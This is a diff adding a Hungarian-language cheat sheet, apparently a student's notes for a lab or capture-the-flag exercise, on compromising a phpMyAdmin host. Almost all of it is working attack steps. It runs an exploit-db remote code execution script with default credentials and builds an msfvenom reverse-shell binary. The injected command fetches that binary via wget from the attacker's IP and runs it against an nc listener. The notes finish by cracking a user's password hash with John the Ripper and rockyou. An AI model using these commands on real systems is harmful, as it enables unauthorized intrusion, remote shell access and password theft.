@@ -1,0 +1,53 @@
+Tamadoip: 40.0.5.9
+Sajatip: 30.0.1.10
+
+phpmyadmin login: pma | pmapass
+
+exploit-db.com !!!!!!!!!
+csak a pipasak kellenek majd zhn
+
+Remote exectution rce letoltve (pma.py)
+
+
+cmd:
+3. TERMINAL
+cd ~/Downloads/ (sajat mappank)
+ls
+python3 pma.py -> hasznalati utmutato
+
+MASIK TERMINALBA (1.TERMINAL)
+{
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=sajatip LPORT=4444(nem lehet 8000) -f elf > shell.elf
+python3 -m http.server 8000
+}
+
+
+AMINT KESZ A MASIKBA, EGY KULON TERMINAL LISTENER (2.TERMINAL)
+{
+nc -lvp 4444
+}
+
+
+3. TERMINALBA
+python3 pma.py celpontip port(80voltmost) /phpmyadmin(loginpage) user jelszo "cd /tmp;rm -f /tmp/shell.elf;wget http://sajatip:port(altalaba8000)/shell.elf;chmod 777 /tmp/shell.elf;/tmp/shell.elf"
+
+
+2. TERMINAL:
+
+python3 -c "import pty;pty.spawn('/bin/bash')"
+
+(bobnak van jelszava passwd-ben)
+
+
+text editor (vscode/notepad):
+
+tokmasusernambob:JELSZO:::::
+
+tokmasusernembob:szovegakettospontigkimasolva:::::
+elmenteni pl bobpassword.txt
+
+ha jelszoba $y$ van (y van) meg kell mondani mi az y (ha nem az van ott akkor ez:
+sudo john bobpassword.txt -wordlist=/usr/share/wordlists/rockyou.txt 
+
+HA $y$ os: sudo john bobpassword.txt -wordlist=/usr/share/wordlists/rockyou.txt --format=crypt
+
